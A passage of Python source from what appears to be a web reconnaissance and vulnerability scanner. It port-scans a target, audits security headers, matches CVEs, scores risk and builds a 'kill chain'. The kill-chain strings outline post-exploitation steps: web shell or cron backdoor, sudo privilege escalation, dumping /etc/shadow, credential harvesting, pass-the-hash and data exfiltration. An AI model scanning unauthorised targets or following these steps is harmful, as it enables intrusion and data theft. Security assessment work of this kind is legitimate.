    ("permissions-policy",        "Permissions-Policy",     "Restricts browser API access (geoloc, camera, etc.)",    "medium"),
    ("x-xss-protection",          "X-XSS-Protection",       "Legacy XSS filter (Chrome removed it, still useful)",   "low"),
    ("cross-origin-opener-policy","COOP",                   "Isolates browsing context, mitigates Spectre",          "medium"),
    ("cross-origin-resource-policy","CORP",                 "Prevents cross-origin resource embedding",               "medium"),
]

def audit_headers(headers: dict) -> list[dict]:
    results = []
    for key, name, desc, importance in SEC_HEADERS:
        present = key in headers
        results.append({
            "key": key, "name": name, "desc": desc,
            "importance": importance,
            "present": present,
            "value": headers.get(key, ""),
            "status": "pass" if present else "fail",
        })
    return results

# ═══════════════════════════════════════════════════════════════════════════════
# NETWORK TOPOLOGY
# ═══════════════════════════════════════════════════════════════════════════════

def build_topology(hostname: str, ip: str, open_ports: list[dict], headers: dict, tech: list[str]) -> dict:
    nodes = [{"id": "attacker", "label": "Attacker\n(You)", "type": "attacker", "x": 0,   "y": 0}]
    edges = []

    # Detect CDN / proxy layer
    cdn_sigs = {
        "cf-ray": "Cloudflare", "x-amz-cf-id": "AWS CloudFront",
        "x-fastly-request-id": "Fastly", "x-cache": "CDN Cache",
        "via": "Reverse Proxy", "x-varnish": "Varnish Cache",
        "x-sucuri-id": "Sucuri WAF",
    }
    cdn_detected = None
    for h, name in cdn_sigs.items():
        if h in headers:
            cdn_detected = name
            break

    if cdn_detected:
        nodes.append({"id": "cdn",    "label": f"{cdn_detected}", "type": "cdn",    "x": 200, "y": 0})
        nodes.append({"id": "target", "label": f"{hostname}\n{ip}",  "type": "target", "x": 400, "y": 0})
        edges.append({"from": "attacker", "to": "cdn",    "label": "HTTPS", "type": "normal"})
        edges.append({"from": "cdn",      "to": "target", "label": "proxied","type": "normal"})
    else:
        nodes.append({"id": "target", "label": f"{hostname}\n{ip}", "type": "target", "x": 300, "y": 0})
        edges.append({"from": "attacker", "to": "target", "label": "direct", "type": "normal"})

    # Add risky service nodes
    y_offset = 100
    for port_info in open_ports:
        if RISK_ORDER.get(port_info["risk"], 3) <= 1:  # critical or high only
            nid = f"svc_{port_info['port']}"
            nodes.append({
                "id":    nid,
                "label": f"{port_info['service']}\n:{port_info['port']}",
                "type":  "service_" + port_info["risk"],
                "x":     400 + (len(nodes) - 2) * 80,
                "y":     y_offset,
            })
            edges.append({"from": "target", "to": nid, "label": f":{port_info['port']}", "type": "risky"})

    return {"nodes": nodes, "edges": edges}

# ═══════════════════════════════════════════════════════════════════════════════
# KILL CHAIN
# ═══════════════════════════════════════════════════════════════════════════════

def build_kill_chain(cves: list[dict], open_ports: list[dict], tech: list[str]) -> list[dict]:
    chain = []
    critical = [c for c in cves if c["severity"] == "critical" and c.get("exploit_type") in ("remote_code_execution","authentication_bypass","sql_injection")]
    high     = [c for c in cves if c["severity"] == "high"]
    client   = [c for c in cves if c.get("exploit_type") in ("cross_site_scripting","clickjacking","csrf")]
    risky_p  = [p for p in open_ports if RISK_ORDER.get(p["risk"], 3) == 0]

    chain.append({"phase": "Reconnaissance", "tactic": "TA0043",
        "action": f"OSINT + active scanning — {len(open_ports)} open ports found, tech stack: {', '.join(tech[:4]) or 'unknown'}",
        "status": "complete", "cve": None})

    if open_ports:
        chain.append({"phase": "Scanning", "tactic": "TA0043",
            "action": f"Service enumeration: {', '.join(str(p['port'])+'/'+p['service'] for p in open_ports[:6])}{'...' if len(open_ports)>6 else ''}",
            "status": "complete", "cve": None})

    if critical:
        top = critical[0]
        chain.append({"phase": "Initial Access", "tactic": "TA0001",
            "action": f"Exploit {top['cve']} — {top['name']} ({top['exploit_type'].replace('_',' ').title()})",
            "status": "exploitable", "cve": top["cve"]})
        chain.append({"phase": "Execution", "tactic": "TA0002",
            "action": f"Payload: {top['poc'].splitlines()[0][:80]}",
            "status": "exploitable", "cve": top["cve"]})
        if top["exploit_type"] in ("remote_code_execution","authentication_bypass"):
            chain.append({"phase": "Persistence", "tactic": "TA0003",
                "action": "Deploy web shell / cron backdoor / scheduled task for re-entry",
                "status": "potential", "cve": None})
            chain.append({"phase": "Privilege Escalation", "tactic": "TA0004",
                "action": "CVE-2021-3156 (sudo) or SUID binary abuse → root",
                "status": "potential", "cve": "CVE-2021-3156"})
            chain.append({"phase": "Credential Access", "tactic": "TA0006",
                "action": "Dump /etc/shadow, extract DB credentials from config files, harvest env vars",
                "status": "potential", "cve": None})
            chain.append({"phase": "Lateral Movement", "tactic": "TA0008",
                "action": "SSH with harvested keys, SMB pass-the-hash to internal hosts",
                "status": "potential", "cve": None})
            chain.append({"phase": "Exfiltration", "tactic": "TA0010",
                "action": "Compress and exfiltrate database dumps, source code, credentials via HTTPS tunnel",
                "status": "potential", "cve": None})
    elif risky_p:
        p = risky_p[0]
        chain.append({"phase": "Initial Access", "tactic": "TA0001",
            "action": f"Exploit exposed {p['service']} on :{p['port']} — {p['desc']}",
            "status": "exploitable", "cve": None})
    elif high:
        top = high[0]
        chain.append({"phase": "Initial Access", "tactic": "TA0001",
            "action": f"Exploit {top['cve']} — {top['name']}",
            "status": "exploitable", "cve": top["cve"]})
    elif client:
        top = client[0]
        chain.append({"phase": "Initial Access", "tactic": "TA0001",
            "action": f"Client-side: {top['name']} — requires victim interaction",
            "status": "client_side", "cve": top["cve"]})
        chain.append({"phase": "Collection", "tactic": "TA0009",
            "action": "XSS keylogger harvests credentials, session cookies, PII from active sessions",
            "status": "potential", "cve": None})
    else:
        chain.append({"phase": "Initial Access", "tactic": "TA0001",
            "action": "No direct exploit path identified — social engineering or zero-day required",
            "status": "blocked", "cve": None})

    return chain

# ═══════════════════════════════════════════════════════════════════════════════
# RISK SCORE
# ═══════════════════════════════════════════════════════════════════════════════

def compute_risk(cves, open_ports, tls) -> "tuple[int, str]":
    score = 0
    if cves:
        max_cvss = max(c["cvss"] for c in cves)
        score += int(max_cvss * 7)
    score += sum(8 if p["risk"] == "critical" else 4 if p["risk"] == "high" else 1 for p in open_ports)
    score += len(cves) * 2
    if tls.get("weak_tls"):
        score += 10
    score = min(score, 100)
    grade = "CRITICAL" if score >= 80 else "HIGH" if score >= 60 else "MEDIUM" if score >= 35 else "LOW"
    return score, grade

# ═══════════════════════════════════════════════════════════════════════════════
# MAIN SCAN
# ═══════════════════════════════════════════════════════════════════════════════

def run_sniper(target: str, mode: str = "both", intensity: int = 2) -> dict:
    if not target.startswith(("http://", "https://")):
        target = "https://" + target
    parsed   = urlparse(target)
    hostname = parsed.hostname or ""
    port_num = parsed.port or (443 if parsed.scheme == "https" else 80)

    try:
        ip = socket.gethostbyname(hostname)
    except Exception as e:
        return {"error": f"Cannot resolve '{hostname}': {e}"}

    # ── HTTP fetch ──────────────────────────────────────────────────────────────
    status, headers, body = fetch(target)
    if status == 0:
        # Try HTTP fallback
        fallback = target.replace("https://", "http://")
        status, headers, body = fetch(fallback)
        if status == 0:
            return {"error": f"Target unreachable — no HTTP or HTTPS response from {hostname}"}

    # ── TLS info ────────────────────────────────────────────────────────────────
    tls = tls_info(hostname, port_num) if parsed.scheme == "https" else {"error": "HTTP only", "weak_tls": False}

    # ── Tech stack ──────────────────────────────────────────────────────────────
    tech_stack = detect_tech(headers, body)

    # ── Port scan ───────────────────────────────────────────────────────────────
    open_ports = []
    if mode in ("remote", "both"):
        scan_ports = PORTS[:12] if intensity == 1 else PORTS[:20] if intensity == 2 else PORTS
        with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as ex:
            futs = {ex.submit(probe_port, hostname, p): p for p in scan_ports}
            for f in concurrent.futures.as_completed(futs):
                p = futs[f]
                try:
                    is_open, banner = f.result(timeout=5)
                    if is_open:
                        svc, risk, desc = PORT_META.get(p, ("Unknown", "medium", ""))
                        open_ports.append({"port": p, "service": svc, "risk": risk, "desc": desc, "banner": banner})
                except Exception:
                    pass
        open_ports.sort(key=lambda x: (RISK_ORDER.get(x["risk"], 3), x["port"]))

    # ── CVE matching ────────────────────────────────────────────────────────────
    cves = match_cves(headers, body, tech_stack, open_ports)

    # ── Header audit ────────────────────────────────────────────────────────────
    hdr_audit = audit_headers(headers)

    # ── Topology + kill chain ───────────────────────────────────────────────────
    topology    = build_topology(hostname, ip, open_ports, headers, tech_stack)
    kill_chain  = build_kill_chain(cves, open_ports, tech_stack)
    risk_score, risk_grade = compute_risk(cves, open_ports, tls)

    # ── Exposed headers (interesting subset) ───────────────────────────────────
    interesting_hdrs = {k: v for k, v in headers.items() if k in [
        "server","x-powered-by","content-security-policy","x-frame-options",
        "strict-transport-security","x-content-type-options","set-cookie",
        "x-xss-protection","access-control-allow-origin","via","cf-ray",
        "x-aspnet-version","x-aspnetmvc-version","x-arequestid",
        "x-confluence-request-time","x-generator","x-drupal-cache",
        "x-application-context","x-jenkins","x-hudson","referrer-policy",
        "permissions-policy","cross-origin-opener-policy",
    ]}

    return {
        "target":          target,
        "hostname":        hostname,
        "ip":              ip,
        "mode":            mode,
        "intensity":       intensity,
        "http_status":     status,
        "timestamp":       time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "tech_stack":      tech_stack,
        "tls":             tls,
        "headers":         interesting_hdrs,
        "header_audit":    hdr_audit,
        "open_ports":      open_ports,
        "cves":            cves,
        "total_cves":      len(cves),
        "critical_count":  sum(1 for c in cves if c["severity"] == "critical"),
        "high_count":      sum(1 for c in cves if c["severity"] == "high"),
        "medium_count":    sum(1 for c in cves if c["severity"] == "medium"),
        "low_count":       sum(1 for c in cves if c["severity"] == "low"),
        "vulnerable":      len(cves) > 0,
        "topology":        topology,
        "kill_chain":      kill_chain,
        "risk_score":      risk_score,
        "risk_grade":      risk_grade,
        "header_pass":     sum(1 for h in hdr_audit if h["status"] == "pass"),
        "header_fail":     sum(1 for h in hdr_audit if h["status"] == "fail"),
    }

# ═══════════════════════════════════════════════════════════════════════════════
# HTTP SERVER
# ═══════════════════════════════════════════════════════════════════════════════

